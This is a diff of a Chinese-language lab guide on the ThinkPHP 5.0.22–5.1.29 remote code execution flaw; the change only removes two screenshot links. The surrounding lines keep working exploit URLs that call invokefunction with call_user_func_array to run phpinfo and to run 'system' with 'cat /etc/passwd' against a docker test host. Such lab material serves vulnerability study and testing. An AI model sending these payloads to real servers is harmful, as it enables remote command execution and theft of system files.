@@ -29,7 +29,7 @@ docker-compose up -d
 
 直接访问 `http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`，即可执行 phpinfo：
 
-![image-20220302150446791](./.resource/ThinkPHP5-5.0.22-5.1.29-远程代码执行漏洞/media/202203021504893.png)
+
 
 
 执行系统命令：
@@ -38,7 +38,7 @@ docker-compose up -d
 http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/etc/passwd
 ```
 
-![image-20220302150508363](./.resource/ThinkPHP5-5.0.22-5.1.29-远程代码执行漏洞/media/202203021505433.png)
+
 
 
 ## 开源 POC/EXP
